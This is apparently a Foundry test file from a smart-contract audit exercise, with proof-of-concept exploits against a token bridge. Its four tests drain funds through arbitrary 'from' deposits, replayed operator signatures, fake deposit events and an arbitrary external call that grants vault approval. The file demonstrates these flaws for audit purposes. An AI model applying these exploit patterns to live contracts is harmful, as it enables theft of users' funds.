// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {L1BossBridge, L1Vault, IERC20} from "../src/L1BossBridge.sol";
import {L1Token} from "../src/L1Token.sol";

contract L1BossBridgeExploitTest is Test {
    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address userInL2 = makeAddr("userInL2");
    Account operator = makeAccount("operator");
    address attacker = makeAddr("attacker");
    address attackerInL2 = makeAddr("attackerInL2");

    L1Token token;
    L1BossBridge tokenBridge;
    L1Vault vault;

    event Deposit(address from, address to, uint256 amount);

    function setUp() public {
        vm.startPrank(deployer);

        // Deploy token and transfer the user some initial balance
        token = new L1Token();
        token.transfer(address(user), 1000e18);

        // Deploy bridge
        tokenBridge = new L1BossBridge(IERC20(token));
        vault = tokenBridge.vault();

        // Add a new allowed signer to the bridge
        tokenBridge.setSigner(operator.addr, true);

        vm.stopPrank();
    }

    /**
     * The `depositTokensToL2` function allows anyone to call it with a `from` address
     * of any account that has approved tokens to the bridge. This allows an attacker
     * to move tokens out of the account, into the bridge, and assign them to their address in L2.
     */
    function testCanMoveApprovedTokensOfOtherUsers() public {
        vm.prank(user);
        token.approve(address(tokenBridge), type(uint256).max);

        uint256 depositAmount = token.balanceOf(user);
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attackerInL2, depositAmount);
        tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);

        assertEq(token.balanceOf(user), 0);
        assertEq(token.balanceOf(address(vault)), depositAmount);
        vm.stopPrank();
    }

    /**
     * The `depositTokensToL2` function allows specifying the `from` address, from which
     * tokens are taken. Because the vault has given infinite approval to the bridge already,
     * it's possible to call depositTokensToL2 and transfer tokens from the vault to itself.
     * This allows an attacker to trigger the `Deposit` event any number of times, presumably
     * causing the minting of unbacked tokens in L2.
     */
    function testCanTransferFromVaultToVault() public {
        vm.startPrank(attacker);

        // assume the vault already holds some tokens
        uint256 vaultBalance = 500 ether;
        deal(address(token), address(vault), vaultBalance);

        // Can trigger the `Deposit` event self-transferring tokens in the vault
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), address(vault), vaultBalance);
        tokenBridge.depositTokensToL2(
            address(vault),
            address(vault),
            vaultBalance
        );

        // Any number of times
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(vault), address(vault), vaultBalance);
        tokenBridge.depositTokensToL2(
            address(vault),
            address(vault),
            vaultBalance
        );

        vm.stopPrank();
    }

    /**
     * Valid signatures from the bridge operator can be reused to continue executing withdrawals
     * due to the lack of nonces (or some other replay-protection mechanism).
     */
    function testCanReplayWithdrawals() public {
        // assume the vault already holds some tokens
        uint256 vaultInitialBalance = 1000e18;
        uint256 attackerInitialBalance = 100e18;
        deal(address(token), address(vault), vaultInitialBalance);
        deal(address(token), address(attacker), attackerInitialBalance);

        // An attacker deposits tokens to L2
        vm.startPrank(attacker);
        token.approve(address(tokenBridge), type(uint256).max);
        tokenBridge.depositTokensToL2(
            attacker,
            attackerInL2,
            attackerInitialBalance
        );

        // Operator signs withdrawal.
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(
            _getTokenWithdrawalMessage(attacker, attackerInitialBalance),
            operator.key
        );

        // The attacker can reuse the signature and drain the vault.
        while (token.balanceOf(address(vault)) > 0) {
            tokenBridge.withdrawTokensToL1(
                attacker,
                attackerInitialBalance,
                v,
                r,
                s
            );
        }
        assertEq(
            token.balanceOf(address(attacker)),
            attackerInitialBalance + vaultInitialBalance
        );
        assertEq(token.balanceOf(address(vault)), 0);
    }

    /**
     * The L1 part of the bridge includes low-level external call that could be used to call
     * sensitive contracts of the bridge. Such as the vault. Because the L1BossBridge owns the L1Vault,
     * an attacker could submit a message that targets the vault and executes is `approveTo` function.
     * This would allow anyone to drain the vault.
     */
    function testCanCallVaultApproveFromBridgeAndDrainVault() public {
        uint256 vaultInitialBalance = 1000e18;
        deal(address(token), address(vault), vaultInitialBalance);

        // An attacker deposits tokens to L2. I do this under the assumption that the
        // bridge operator needs to see a valid deposit tx to then allow me to request a withdrawal.
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(address(attacker), address(0), 0);
        tokenBridge.depositTokensToL2(attacker, address(0), 0);

        // Under the assumption that the bridge operator doesn't validate bytes being signed
        bytes memory message = abi.encode(
            address(vault), // target
            0, // value
            abi.encodeCall(
                L1Vault.approveTo,
                (address(attacker), type(uint256).max)
            ) // data
        );
        (uint8 v, bytes32 r, bytes32 s) = _signMessage(message, operator.key);

        tokenBridge.sendToL1(v, r, s, message);
        assertEq(token.allowance(address(vault), attacker), type(uint256).max);
        token.transferFrom(
            address(vault),
            attacker,
            token.balanceOf(address(vault))
        );
    }

    function _getTokenWithdrawalMessage(
        address recipient,
        uint256 amount
    ) private view returns (bytes memory) {
        return
            abi.encode(
                address(token), // target
                0, // value
                abi.encodeCall(
                    IERC20.transferFrom,
                    (address(vault), recipient, amount)
                ) // data
            );
    }

    /**
     * Mocks part of the off-chain mechanism where there operator approves requests for withdrawals by signing them.
     * Although not coded here (for simplicity), you can safely assume that our operator refuses to sign any withdrawal
     * request from an account that never originated a transaction containing a successful deposit.
     */
    function _signMessage(
        bytes memory message,
        uint256 privateKey
    ) private pure returns (uint8 v, bytes32 r, bytes32 s) {
        return
            vm.sign(
                privateKey,
                MessageHashUtils.toEthSignedMessageHash(keccak256(message))
            );
    }
}
